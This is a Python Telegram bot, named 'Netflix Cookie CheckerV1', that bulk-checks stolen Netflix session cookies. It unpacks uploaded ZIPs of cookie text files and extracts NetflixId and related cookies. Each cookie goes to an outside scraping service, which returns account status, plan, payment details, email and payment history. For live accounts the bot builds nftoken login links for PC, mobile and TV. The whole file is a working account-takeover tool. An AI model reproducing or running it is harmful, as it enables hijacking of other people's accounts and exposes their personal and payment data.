import os
import re
import json
import zipfile
import requests
import tempfile
from telegram.ext import Updater, MessageHandler, CommandHandler, Filters
from telegram import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup

BOT_TOKEN = os.environ["BOT_TOKEN"]
SCRAPE_URL = "https://netflix-checker-3pev.onrender.com/scrape"
WAKE_URL = "https://netflix-checker-3pev.onrender.com/withdraw?cookie=test"

COOKIE_KEYS = ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"]

def wake_up_server():
    try:
        requests.get(WAKE_URL, timeout=60)
        return True
    except:
        return False

def extract_cookie_from_text(text):
    for line in text.splitlines():
        if "NetflixId" in line and "\t" in line:
            parts = line.split("\t")
            for i, part in enumerate(parts):
                if part.strip() == "NetflixId":
                    if i + 1 < len(parts):
                        value = parts[i + 1].strip()
                        if value:
                            cookie_str = f"NetflixId={value}"
                            for line2 in text.splitlines():
                                if "SecureNetflixId" in line2 and "\t" in line2:
                                    parts2 = line2.split("\t")
                                    for j, p in enumerate(parts2):
                                        if p.strip() == "SecureNetflixId":
                                            if j + 1 < len(parts2):
                                                cookie_str += f"; SecureNetflixId={parts2[j+1].strip()}"
                                            break
                            for line3 in text.splitlines():
                                if "nfvdid" in line3 and "\t" in line3:
                                    parts3 = line3.split("\t")
                                    for k, p in enumerate(parts3):
                                        if p.strip() == "nfvdid":
                                            if k + 1 < len(parts3):
                                                cookie_str += f"; nfvdid={parts3[k+1].strip()}"
                                            break
                            return cookie_str
    return ""

def check_cookie(cookie_raw):
    try:
        response = requests.get(
            SCRAPE_URL,
            params={"cookie": cookie_raw},
            timeout=120
        )
        return response.json()
    except Exception as e:
        return {"error": str(e)}

def format_result(d, index, total, filename):
    base = "https://www.netflix.com"
    token = d.get("token", "")

    msg = (
        f"🎬 <b>NETFLIX ACCOUNT {index}/{total}</b> 🎬\n"
        f"📄 <code>{filename}</code>\n\n"
        f"🔴 <b>Status:</b> {d.get('status', 'Unknown')}\n"
        f"🌍 <b>Region:</b> {d.get('country', 'Unknown')}\n"
        f"🕐 <b>Member Since:</b> {d.get('member_since', 'Unknown')}\n"
        f"👑 <b>Plan:</b> {d.get('plan', 'Unknown')}\n"
        f"💳 <b>Payment:</b> {d.get('payment', 'Unknown')}\n"
        f"📧 <b>Email:</b> {d.get('email', 'Unknown')}\n"
        f"   {d.get('email_verified', 'Unknown')}\n"
        f"📱 <b>Phone:</b> {d.get('phone_verified', 'Unknown')}\n"
        f"👥 <b>Extra Members:</b> {d.get('extra_members', 'Unknown')}\n"
        f"🎭 <b>Profiles:</b> {d.get('profiles', 'Unknown')}\n"
        f"💰 <b>Last 3 Payments:</b> {d.get('payment_history', 'Unknown')}\n\n"
        f"⏰ <b>Expires:</b> {d.get('expires', 'Unknown')}"
    )

    buttons = None
    if token:
        buttons = InlineKeyboardMarkup([[
            InlineKeyboardButton("🖥 PC", url=f"{base}/account?nftoken={token}"),
            InlineKeyboardButton("📱 MOBILE", url=f"{base}/unsupported?nftoken={token}"),
            InlineKeyboardButton("📺 TV", url=f"{base}/tv9?nftoken={token}")
        ]])

    return msg, buttons

def handle_start(update, context):
    update.message.reply_text(
        "👋 <b>Netflix Cookie CheckerV1 Bot</b>\n\n"
        "📦 Just send me a <b>ZIP file</b> containing Netflix cookie .txt files\n"
        "I will check each account automatically!\n\n"
        "✅ Shows: Status, Plan, Payment, Email, Profiles and more!",
        parse_mode=ParseMode.HTML
    )

def handle_document(update, context):
    doc = update.message.document

    if not doc.file_name.lower().endswith(".zip"):
        return

    chat_id = update.message.chat_id

    # Step 1 - Wake up server
    wake_msg = context.bot.send_message(
        chat_id=chat_id,
        text="⏳ <b>Waking up server...</b>\nPlease wait 30-60 seconds...",
        parse_mode=ParseMode.HTML
    )

    wake_up_server()

    context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=wake_msg.message_id,
        text="✅ <b>Server is awake!</b>\n📦 Now downloading your ZIP file...",
        parse_mode=ParseMode.HTML
    )

    # Step 2 - Download and process ZIP
    progress_msg = context.bot.send_message(
        chat_id=chat_id,
        text="📦 <b>Downloading and extracting ZIP...</b>",
        parse_mode=ParseMode.HTML
    )

    try:
        file = context.bot.get_file(doc.file_id)

        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = os.path.join(tmpdir, "cookies.zip")
            file.download(zip_path)

            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(tmpdir)

            txt_files = []
            for root, dirs, files in os.walk(tmpdir):
                for f in files:
                    if f.lower().endswith(".txt"):
                        txt_files.append(os.path.join(root, f))

            total = len(txt_files)

            if total == 0:
                context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text="❌ No .txt files found in ZIP!",
                    parse_mode=ParseMode.HTML
                )
                return

            context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=f"✅ Found <b>{total}</b> accounts!\n⏳ Checking one by one...",
                parse_mode=ParseMode.HTML
            )

            active = 0
            expired = 0
            errors = 0

            for i, txt_path in enumerate(txt_files, 1):
                filename = os.path.basename(txt_path)

                try:
                    with open(txt_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read().strip()

                    if not content:
                        errors += 1
                        continue

                    cookie_raw = extract_cookie_from_text(content)

                    if not cookie_raw:
                        errors += 1
                        context.bot.send_message(
                            chat_id=chat_id,
                            text=f"⚠️ <b>{i}/{total}</b> - <code>{filename}</code>\nCould not extract cookie",
                            parse_mode=ParseMode.HTML
                        )
                        continue

                    if i % 5 == 0 or i == 1:
                        try:
                            context.bot.edit_message_text(
                                chat_id=chat_id,
                                message_id=progress_msg.message_id,
                                text=f"⏳ Checking <b>{i}/{total}</b>...\n✅ Active: {active} | ❌ Expired: {expired} | ⚠️ Errors: {errors}",
                                parse_mode=ParseMode.HTML
                            )
                        except:
                            pass

                    result = check_cookie(cookie_raw)

                    if "error" in result:
                        errors += 1
                        context.bot.send_message(
                            chat_id=chat_id,
                            text=f"❌ <b>{i}/{total}</b> - <code>{filename}</code>\nError: {result['error']}",
                            parse_mode=ParseMode.HTML
                        )
                        continue

                    status = result.get("status", "")
                    if "Active" in status:
                        active += 1
                    else:
                        expired += 1

                    msg, buttons = format_result(result, i, total, filename)

                    context.bot.send_message(
                        chat_id=chat_id,
                        text=msg,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                        reply_markup=buttons
                    )

                except Exception as e:
                    errors += 1
                    continue

            try:
                context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=(
                        f"✅ <b>Checking Complete!</b>\n\n"
                        f"📊 <b>Summary:</b>\n"
                        f"✅ Active: <b>{active}</b>\n"
                        f"❌ Expired: <b>{expired}</b>\n"
                        f"⚠️ Errors: <b>{errors}</b>\n"
                        f"📦 Total: <b>{total}</b>"
                    ),
                    parse_mode=ParseMode.HTML
                )
            except:
                pass

    except zipfile.BadZipFile:
        context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=progress_msg.message_id,
            text="❌ Invalid ZIP file!",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=progress_msg.message_id,
            text=f"❌ Error: {str(e)}",
            parse_mode=ParseMode.HTML
        )

updater = Updater(token=BOT_TOKEN)
dp = updater.dispatcher
dp.add_handler(CommandHandler("start", handle_start))
dp.add_handler(MessageHandler(Filters.document, handle_document))
updater.start_polling()
updater.idle()
